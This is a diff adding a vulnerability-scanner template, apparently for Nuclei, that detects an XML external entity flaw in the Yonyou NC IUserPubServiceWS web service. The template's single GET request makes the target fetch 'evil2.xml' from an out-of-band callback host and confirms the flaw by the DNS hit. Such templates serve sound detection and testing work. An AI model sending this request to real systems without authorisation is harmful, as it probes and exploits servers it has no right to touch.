@@ -1,0 +1,18 @@
+id: poc-yaml-yongyou-iuserpubservicews-xxe
+info:
+  name: "用友 NC IUserPubServiceWS接口xml外部实体注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 用友NC
+http:
+  - raw:
+      - |
+        GET /uapws/service/nc.pubitf.rbac.IUserPubServiceWS?xsd=http://{{interactsh-url}}/evil2.xml HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+    stop-at-first-match: true
